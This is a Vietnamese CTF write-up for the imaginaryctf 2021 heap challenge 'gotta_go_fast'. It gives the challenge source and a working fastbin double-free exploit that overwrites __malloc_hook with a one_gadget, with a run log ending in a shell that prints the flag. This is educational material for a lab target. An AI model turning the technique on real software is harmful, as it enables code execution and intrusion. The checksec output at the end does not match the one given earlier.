<h1>Writeup imaginaryctf 2021</h1>
<h1>Author: dV</h1>
<h2>Challenge Name: gotta_go_fast</h2>
<h3>Phân tích file</h3>
   <h4>Các cơ chế 
  
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
<h3>Reversing file</h3> 
Bài này tác giả cho sẵn source nên mình đỡ phải reverse bằng ida.
  <h4>
  
    #include <limits.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    typedef struct Tribute {
        char name[100];
        short district;
        short index_in_district;
    } Tribute;

    typedef struct TributeList {
        Tribute* tributes[100];
        struct TributeList* next;
        int in_use;
    } TributeList;

    TributeList* head;

    int list_append(Tribute* t) {
        int offset = 0;
        TributeList* cur = head;
        while (cur->in_use == 100) {
            if (cur->next == NULL) {
                cur->next = malloc(sizeof(TributeList));
                cur->next->next = NULL;
                cur->next->in_use = 0;
            }
            offset += 100;
            cur = cur->next;
        }
        offset += cur->in_use;
        cur->tributes[cur->in_use++] = t;
        return offset;
    }

    void list_remove(int idx) {
        TributeList* last = head;
        while (last->next != NULL) {
            if (last->next->in_use == 0) {
                free(last->next);
                last->next = NULL;
                break;
            }
            last = last->next;
        }

        TributeList* cur = head;
        while ((cur->in_use == 100 && idx >= 100)) {
            if (!cur->next) {
                abort();
            }
            cur = cur->next;
            idx -= 100;
        }
        Tribute* t = last->tributes[last->in_use - 1];
        last->tributes[last->in_use - 1] = cur->tributes[idx];
        free(last->tributes[last->in_use - 1]);
        cur->tributes[idx] = t;
        last->in_use--;
    }

    int readint(int lo, int hi) {
        int res = -1;
        while (1) {
            printf("> ");
            scanf("%d", &res);
            if (res >= lo && res <= hi) {
                return res;
            }
        }
    }

    void init() {
        head = malloc(sizeof(TributeList));
        head->next = NULL;
        head->in_use = 0;

        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);

        alarm(180);
    }

    void menu() {
        puts("What would you like to do?");
        puts(" [0] Draft a new tribute");
        puts(" [1] Remove a tribute from the list (because someone volunteered in their place again, people should really stop doing that, it messes with our management system)");
        puts(" [2] See an overview of the current tributes");
        puts(" [3] Start the games, may the odds be ever in your favor!");
    }

    void draft() {
        Tribute* t = malloc(sizeof(Tribute));
        puts("For which district will this tribute fight?");
        t->district = readint(1, 12);
        puts("What's the position among the tributes for this district?");
        t->index_in_district = readint(1, 2);
        puts("Least importantly, what's their name?");
        scanf("%99s", t->name);

        printf("Noted, this is tribute %d\n", list_append(t));
    }

    void undraft() {
        puts("Which tribute should be undrafted?");
        int idx = readint(0, INT_MAX);
        list_remove(idx);
        puts("done.");
    }

    void list() {
        int idx = 0;
        TributeList* cur = head;
        while (cur) {
            for (int i = 0; i < cur->in_use; i++, idx++) {
                Tribute* t = cur->tributes[i];
                printf("Tribute %d [%s] fights in position %d for district %d.\n", idx, t->name, t->index_in_district, t->district);
            }
            cur = cur->next;
        }
    }

    void run() {
        puts("TODO: implement this simulation into the matrix.");
        exit(0);
    }

    int have_diagnosed = 0;
    void diagnostics() {
        if (have_diagnosed) {
            puts("I understand things might be broken, but we should keep some semblance of security.");
            abort();
        }
        have_diagnosed = 1;
        puts("I take it the management system was ruined by volunteers again? Just let me know which memory address you need...");
        unsigned long long x = 0;
        scanf("%llu", &x);
        printf("%p\n", *(void**)x);
    }

    int main() {
        init();

        puts("Welcome to the Hunger Games management system.");

        while (1) {
            menu();
            int choice = readint(0, 4);
            switch (choice) {
                case 0:
                    draft();
                    break;
                case 1:
                    undraft();
                    break;
                case 2:
                    list();
                    break;
                case 3:
                    run();
                    break;
                case 4:
                    diagnostics();
                    break;
                default:
                    abort(); // Shouldn't happen anyway
            }
        }
    }
Chương trình có 5 chức năng chính:
  <h4>
  
     Welcome to the Hunger Games management system.
     What would you like to do?
     [0] Draft a new tribute
     [1] Remove a tribute from the list (because someone volunteered in their place again, people should really stop doing that, it messes with our management system)
     [2] See an overview of the current tributes
     [3] Start the games, may the odds be ever in your favor!
     [4] Để leak 1 địa chỉ thông qua got.
     
0: Sẽ malloc cho ta 1 size cố định là 0x68.

1: Free theo index.

2: Hiển thị list ra màn hình.

3: Exit.

4: Leak địa chỉ.

Sau khi leak địa chỉ hàm free và search libc trên web: https://libc.blukat.me/ thì mình biết được libc là 2.23, và size được malloc nằm trong fastbin nên bài này mình sẽ dùng double free và fastbin attack để khai thác.
Mình sẽ malloc() 2 chunk rồi sau đó free xen kẽ nhau để bypass fasttop( cơ chế check của glibc), lúc này trong bin sẽ như sau: 0x70: 0x6033b0 —▸ 0x603340 ◂— 0x6033b0 giờ mình malloc 1 chunk thì chunk đó sẽ là 0x6033b0, vừa được sử dụng và vừa có trong bin nên khi ta thay đổi data của chunk này thì fd trong bin sẽ thay đổi theo.
Ý tưởng sẽ là thay đổi data của chunk đó sao cho fd trong bin trỏ đến __malloc_hook, rồi sau đó ta sẽ ghi đè địa one_gadget vào.

Đoạn exploit của mình sau khi leak được libc như sau:
  <h4>
  
    add(b'a')
    add(b'b')

    free(1)
    free(0)
    free(1)
    #bin: 1->0->1
    add(p64(malloc - 0x23))
    #bin: 0->1<-malloc_hook-0x23
    add("c")
    add("d")
    #bin: malloc_hook-0x23
    add("z"*0x13 + p64(one))
Lý do mình không ghi đè thẳng vào malloc_hook mà phải trừ 0x23 là do trước khi malloc 1 chunk ở fastbin nó sẽ có 1 đoạn check:
Kiểm tra xem kích thước của freechunk mình muốn malloc có nằm trong phạm vi kích thước của chuỗi fastbin hay không.

Nếu mình ghi thẳng vào malloc_hook nó sẽ xem địa chỉ của malloc_hook là metadata, có prev_size và size, khi malloc nó sẽ như sau:
  <h4>
  
    0x7ffff7dd1b10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
Như ta thấy thì size của chunk này là 0x0 nên sẽ không phù hợp vì ta cấp phát 1 chunk có size là 0x70 ở bin. Vậy nên vị trí malloc_hook -0x23 thì vị trí của size mặc định là 0x7f vừa phù hợp với size ta malloc.

  <h4>
  
    malloc_hook-0x23: 0x7ffff7dd1aed <_IO_wide_data_0+301>:   0xfff7dd0260000000      0x000000000000007f. Ta có thể bypass được check.
Khoảng cách giữa malloc_hook và phần data(malloc_hook-0x23) là 0x13, ta chỉ cần đưa one_gadget vào vị trí sau 13 bytes rác là ghi đè malloc_hook thành công.
  <h4>
  
    0x7ffff7dd1b10 <__malloc_hook>: 0x00007ffff7afd364(one_gadget)      0x0000000000000000
Giờ ta chỉ cần gọi malloc 1 lần nữa là get được shell.
  <h4>
  
          Arch:     amd64-64-little
          RELRO:    Partial RELRO
          Stack:    Canary found
          NX:       NX enabled
          PIE:      PIE enabled
      puts:  0x7f96b8e346a0
      Base:  0x7f96b8dc5000
      One:  0x7f96b8eb5364
      Malloc:  0x7f96b9189b10
      Add...
      Add...
      Free...
      Free...
      Free...
      Add...
      Add...
      Add...
      Add...
      [*] Switching to interactive mode
      Noted, this is tribute 2
      What would you like to do?
       [0] Draft a new tribute
       [1] Remove a tribute from the list (because someone volunteered in their place again, people should really stop doing that, it messes with our management system)
       [2] See an overview of the current tributes
       [3] Start the games, may the odds be ever in your favor!
      > $ cat flag.txt
      ictf{s4n1c_w1ns_th3_hung3r_G4M3S!}
      $
